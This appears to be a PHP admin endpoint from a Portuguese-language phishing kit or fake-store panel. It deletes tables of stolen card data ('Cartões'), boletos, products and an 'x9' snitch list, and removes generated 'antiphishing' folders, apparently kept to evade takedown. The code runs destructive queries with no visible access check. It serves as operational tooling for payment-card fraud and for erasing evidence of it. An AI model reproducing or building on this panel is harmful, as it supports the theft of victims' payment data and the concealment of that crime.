<br><?php

	include_once "../settings/conn.php";
	include_once "../settings/functions.php";

	if ($_POST['qual'] == "infos") {
		query("DELETE FROM infos");
		echo message("Cartões deletados com sucesso", "success");
		echo '<meta http-equiv=refresh content="1; url=index.php?adminunlocked">';
	}elseif ($_POST['qual'] == "boletos") {
		query("DELETE FROM boletos");
		query("DELETE FROM info_boleto");
		echo message("Boletos deletados com sucesso", "success");
		echo '<meta http-equiv=refresh content="1; url=index.php?adminunlocked">';
	}elseif ($_POST['qual'] == "visitas") {
		query("UPDATE produtos SET visitas = 0");
		echo message("Registro de visitas deletado com sucesso", "success");
		echo '<meta http-equiv=refresh content="1; url=index.php?adminunlocked">';
	}elseif ($_POST['qual'] == "produtos") {
		query("DELETE FROM produtos");
		echo message("Produtos deletados com sucesso", "success");
		echo '<meta http-equiv=refresh content="1; url=index.php?adminunlocked">';
	}elseif ($_POST['qual'] == "bd") {
		query("DELETE FROM infos");
		query("DELETE FROM boletos");
		query("DELETE FROM info_boleto");
		query("DELETE FROM produtos");
		query("DELETE FROM x9");
		$antiphishing = query("SELECT pasta FROM antiphishing");
		while ($row = assoc($antiphishing)) {
			apagarDiretorio("../".$row['pasta']);
		}
		query("DELETE FROM antiphishing");
		echo message("Banco de Dados deletado com sucesso", "success");
		echo '<meta http-equiv=refresh content="1; url=index.php?adminunlocked">';
	}elseif ($_POST['qual'] == "antiphishing") {
		$antiphishing = query("SELECT pasta FROM antiphishing");
		while ($row = assoc($antiphishing)) {
			apagarDiretorio("../".$row['pasta']);
		}
		query("DELETE FROM antiphishing");
		echo message("Cache do antiphishing deletado com sucesso", "success");
		echo '<meta http-equiv=refresh content="1; url=index.php?adminunlocked">';
	}elseif ($_POST['qual'] == "x9") {
		query("DELETE FROM x9");
		echo message("Lista de X9 deletado com sucesso", "success");
		echo '<meta http-equiv=refresh content="1; url=index.php?adminunlocked">';
	}else{
		echo message("Error", "danger");
	}
	

?>